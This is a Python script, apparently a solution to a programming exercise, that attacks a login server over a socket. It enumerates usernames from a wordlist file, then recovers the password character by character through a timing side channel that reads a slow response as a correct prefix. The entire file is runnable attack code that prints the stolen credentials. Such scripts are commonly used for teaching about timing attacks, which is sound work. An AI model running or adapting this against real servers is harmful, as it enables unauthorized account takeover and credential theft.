import argparse
import socket
import os
import json
import string
from time import time

WRONG_LOGIN = 'Wrong login!'
SUCCESS = 'Connection success!'

abc = string.ascii_letters + string.digits


def get_json_credentials(login: str, password: str = ' '):
    return json.dumps({'login': login, 'password': password})


def hack_server(ip_address: str, port: int):
    try:
        with socket.socket() as hacking_socket, \
                open(os.path.join(os.path.dirname(__file__), 'logins.txt'), 'r') as login_file:

            hacking_socket.connect((ip_address, port))

            right_login = None
            right_password = None
            accepted_pass_symbols = ''

            for login in login_file:
                login = login.strip()
                hacking_socket.send(get_json_credentials(login).encode())
                data = json.loads(hacking_socket.recv(1024).decode())
                if data['result'] != WRONG_LOGIN:
                    right_login = login
                    break

            while not right_password:
                for next_symbol in abc:
                    start_time = time()
                    hacking_socket.send(get_json_credentials(
                        right_login,
                        accepted_pass_symbols + next_symbol
                    ).encode())
                    data = json.loads(hacking_socket.recv(1024).decode())
                    result = data['result']
                    elapsed_time = time() - start_time

                    if elapsed_time > 0.1:
                        accepted_pass_symbols += next_symbol
                        break
                    elif result == SUCCESS:
                        right_password = accepted_pass_symbols + next_symbol
                        break

            print(get_json_credentials(right_login, right_password))

    except ConnectionRefusedError:
        print('Connection refused')
        exit()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address')
    parser.add_argument('port', type=int)
    args = parser.parse_args()

    hack_server(args.ip_address, args.port)


if __name__ == '__main__':
    main()
